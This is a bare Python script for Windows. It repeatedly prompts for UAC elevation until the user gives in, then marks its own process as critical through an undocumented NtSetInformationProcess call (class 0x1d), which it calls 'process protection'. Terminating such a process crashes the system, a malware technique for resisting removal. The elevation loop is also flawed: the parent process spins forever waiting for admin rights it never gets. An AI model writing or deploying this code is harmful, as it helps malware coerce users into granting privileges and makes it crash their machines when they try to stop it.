import ctypes
from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer
import ctypes.wintypes
import sys
import os

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def elevate_privileges():
    while not is_admin():
        script = os.path.abspath(sys.argv[0])
        params = ' '.join([script] + sys.argv[1:])
        result = ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, params, None, 1)

        if result <= 32:
            print("Failed to elevate privileges, please try again.")
            continue
        else:
            while not is_admin():
                continue

elevate_privileges()

PROCESS_TERMINATE = 0x0001
PROCESS_SET_INFORMATION = 0x0200
PROCESS_DUP_HANDLE = 0x0040
HANDLE_FLAG_INHERIT = 0x00000001
STATUS_SUCCESS = 0x00000000

handle = ctypes.windll.kernel32.OpenProcess(PROCESS_TERMINATE | PROCESS_SET_INFORMATION | PROCESS_DUP_HANDLE, False, ctypes.windll.kernel32.GetCurrentProcessId())

ret = ctypes.windll.ntdll.NtSetInformationProcess(handle, 0x1d, ctypes.byref(ctypes.c_ulong(1)), ctypes.sizeof(ctypes.c_ulong))

if ret == STATUS_SUCCESS:
    print("Process protection enabled.")
else:
    print("Failed to enable process protection.")
    sys.exit(1)
